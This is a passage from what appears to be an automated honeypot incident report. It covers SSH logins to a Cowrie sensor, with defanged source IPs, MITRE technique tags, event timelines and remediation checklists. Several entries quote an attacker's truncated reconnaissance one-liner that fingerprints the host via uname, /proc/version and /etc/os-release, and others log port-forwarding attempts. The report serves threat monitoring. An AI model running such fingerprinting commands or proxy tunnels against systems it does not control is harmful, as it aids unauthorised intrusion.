| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:13:54` | `cowrie.session.connect` |
| `2026-08-23 20:13:54` | `cowrie.client.version` |
| `2026-08-23 20:13:54` | `cowrie.client.kex` |
| `2026-08-23 20:13:56` | `cowrie.login.success` |
| `2026-08-23 20:13:57` | `cowrie.session.params` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.success` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.command.input` |
| `2026-08-23 20:13:57` | `cowrie.log.closed` |
| `2026-08-23 20:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08696746d4b4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:15 |
| **Last Seen** | 2026-08-23 20:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:15:39` | `cowrie.session.connect` |
| `2026-08-23 20:15:39` | `cowrie.client.version` |
| `2026-08-23 20:15:39` | `cowrie.client.kex` |
| `2026-08-23 20:15:40` | `cowrie.login.success` |
| `2026-08-23 20:15:41` | `cowrie.session.params` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.success` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.command.input` |
| `2026-08-23 20:15:41` | `cowrie.log.closed` |
| `2026-08-23 20:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f275a9dd6e0a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:17 |
| **Last Seen** | 2026-08-23 20:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:17:00` | `cowrie.session.connect` |
| `2026-08-23 20:17:00` | `cowrie.client.version` |
| `2026-08-23 20:17:00` | `cowrie.client.kex` |
| `2026-08-23 20:17:03` | `cowrie.login.success` |
| `2026-08-23 20:17:03` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:17:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:17:03` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be437f8c01aa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:17 |
| **Last Seen** | 2026-08-23 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:17:04` | `cowrie.session.connect` |
| `2026-08-23 20:17:04` | `cowrie.client.version` |
| `2026-08-23 20:17:04` | `cowrie.client.kex` |
| `2026-08-23 20:17:05` | `cowrie.login.success` |
| `2026-08-23 20:17:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:17:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:17:06` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc104f742a2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:17 |
| **Last Seen** | 2026-08-23 20:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:17:23` | `cowrie.session.connect` |
| `2026-08-23 20:17:23` | `cowrie.client.version` |
| `2026-08-23 20:17:23` | `cowrie.client.kex` |
| `2026-08-23 20:17:25` | `cowrie.login.success` |
| `2026-08-23 20:17:26` | `cowrie.session.params` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.success` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:26` | `cowrie.command.input` |
| `2026-08-23 20:17:27` | `cowrie.log.closed` |
| `2026-08-23 20:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f7485ac2a96

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 20:19 |
| **Last Seen** | 2026-08-23 20:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:19:07` | `cowrie.session.connect` |
| `2026-08-23 20:19:07` | `cowrie.client.version` |
| `2026-08-23 20:19:07` | `cowrie.client.kex` |
| `2026-08-23 20:19:08` | `cowrie.login.success` |
| `2026-08-23 20:19:09` | `cowrie.session.params` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.success` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:09` | `cowrie.command.input` |
| `2026-08-23 20:19:10` | `cowrie.log.closed` |
| `2026-08-23 20:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998a3f662498

| Field | Detail |
|---|---|
| **Source IP** | `201.163.73[.]88` |
| **First Seen** | 2026-08-23 20:20 |
| **Last Seen** | 2026-08-23 20:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:20:27` | `cowrie.session.connect` |
| `2026-08-23 20:20:27` | `cowrie.client.version` |
| `2026-08-23 20:20:27` | `cowrie.client.kex` |
| `2026-08-23 20:20:28` | `cowrie.login.success` |
| `2026-08-23 20:20:29` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.163.73[.]88` to AbuseIPDB if not already reported
- [ ] Block `201.163.73[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a84fa6ec3f1a

| Field | Detail |
|---|---|
| **Source IP** | `112.78.177[.]237` |
| **First Seen** | 2026-08-23 20:20 |
| **Last Seen** | 2026-08-23 20:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:20:34` | `cowrie.session.connect` |
| `2026-08-23 20:20:34` | `cowrie.client.version` |
| `2026-08-23 20:20:34` | `cowrie.client.kex` |
| `2026-08-23 20:20:36` | `cowrie.login.success` |
| `2026-08-23 20:20:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.177[.]237` to AbuseIPDB if not already reported
- [ ] Block `112.78.177[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-616539db276b

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-08-23 20:24 |
| **Last Seen** | 2026-08-23 20:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:24:38` | `cowrie.session.connect` |
| `2026-08-23 20:24:39` | `cowrie.client.version` |
| `2026-08-23 20:24:39` | `cowrie.client.kex` |
| `2026-08-23 20:24:41` | `cowrie.login.success` |
| `2026-08-23 20:24:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-442547afb4f4

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-23 20:24 |
| **Last Seen** | 2026-08-23 20:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:24:47` | `cowrie.session.connect` |
| `2026-08-23 20:24:49` | `cowrie.client.version` |
| `2026-08-23 20:24:49` | `cowrie.client.kex` |
| `2026-08-23 20:24:51` | `cowrie.login.success` |
| `2026-08-23 20:24:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e73d38b5a95c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:26 |
| **Last Seen** | 2026-08-23 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:26:38` | `cowrie.session.connect` |
| `2026-08-23 20:26:38` | `cowrie.client.version` |
| `2026-08-23 20:26:38` | `cowrie.client.kex` |
| `2026-08-23 20:26:39` | `cowrie.login.success` |
| `2026-08-23 20:26:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:26:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:26:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db120b75e5c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:26 |
| **Last Seen** | 2026-08-23 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:26:42` | `cowrie.session.connect` |
| `2026-08-23 20:26:42` | `cowrie.client.version` |
| `2026-08-23 20:26:42` | `cowrie.client.kex` |
| `2026-08-23 20:26:43` | `cowrie.login.success` |
| `2026-08-23 20:26:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:26:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:26:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-268e220ee071

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:32 |
| **Last Seen** | 2026-08-23 20:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:32:31` | `cowrie.session.connect` |
| `2026-08-23 20:32:31` | `cowrie.client.version` |
| `2026-08-23 20:32:31` | `cowrie.client.kex` |
| `2026-08-23 20:32:32` | `cowrie.login.success` |
| `2026-08-23 20:32:34` | `cowrie.session.params` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.success` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.command.input` |
| `2026-08-23 20:32:34` | `cowrie.log.closed` |
| `2026-08-23 20:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a219cc6257b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:34 |
| **Last Seen** | 2026-08-23 20:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:34:16` | `cowrie.session.connect` |
| `2026-08-23 20:34:16` | `cowrie.client.version` |
| `2026-08-23 20:34:16` | `cowrie.client.kex` |
| `2026-08-23 20:34:17` | `cowrie.login.success` |
| `2026-08-23 20:34:18` | `cowrie.session.params` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.success` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:18` | `cowrie.command.input` |
| `2026-08-23 20:34:19` | `cowrie.log.closed` |
| `2026-08-23 20:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108298082899

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:36 |
| **Last Seen** | 2026-08-23 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:36:06` | `cowrie.session.connect` |
| `2026-08-23 20:36:06` | `cowrie.client.version` |
| `2026-08-23 20:36:06` | `cowrie.client.kex` |
| `2026-08-23 20:36:07` | `cowrie.login.success` |
| `2026-08-23 20:36:07` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:36:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:36:08` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce64bd58b06a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 20:36 |
| **Last Seen** | 2026-08-23 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:36:10` | `cowrie.session.connect` |
| `2026-08-23 20:36:10` | `cowrie.client.version` |
| `2026-08-23 20:36:10` | `cowrie.client.kex` |
| `2026-08-23 20:36:11` | `cowrie.login.success` |
| `2026-08-23 20:36:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 20:36:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 20:36:12` | `cowrie.direct-tcpip.data` |
| `2026-08-23 20:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9a926a6bba

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:36 |
| **Last Seen** | 2026-08-23 20:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 20:36:12` | `cowrie.session.connect` |
| `2026-08-23 20:36:12` | `cowrie.client.version` |
| `2026-08-23 20:36:12` | `cowrie.client.kex` |
| `2026-08-23 20:36:13` | `cowrie.login.success` |
| `2026-08-23 20:36:14` | `cowrie.session.params` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.success` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.command.input` |
| `2026-08-23 20:36:14` | `cowrie.log.closed` |
| `2026-08-23 20:36:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e8a0e08630

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-23 20:38 |
| **Last Seen** | 2026-08-23 20:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
